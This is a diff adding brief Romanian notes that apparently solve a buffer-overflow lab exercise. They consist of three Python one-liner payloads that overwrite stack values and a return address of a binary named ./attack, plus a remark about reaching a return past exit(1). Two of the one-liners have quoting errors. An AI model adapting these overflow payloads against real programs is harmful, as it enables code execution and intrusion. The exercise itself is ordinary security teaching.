@@ -1,0 +1,13 @@
+cu dragoste de la CA
+
+rezolvare a)
+python -c 'print "A" * 64 + "\xbe\xba\xfe\xca"
+
+Nu poti sa dai return address daca tu in functia respectiva ai exit(1), trebuie sa treci
+prin conditii astfel incat sa ai un return
+
+rezolvare b)
+python -c 'print "A" * 64 + "\xbe\xba\xfe\xca" + "A" * 4 + "\x82\x91\x04\x08" + "\n" + "A" * 72 + "\xef\xbe\xad\xde" + ' | ./attack 
+
+rezolvare c)
+python -c 'print "A" * 64 + "\xbe\xba\xfe\xca" + "\n" + "A" * 68 + "\x82\x91\x04\x08" + "\xef\xbe\xad\xde"' | ./attack  
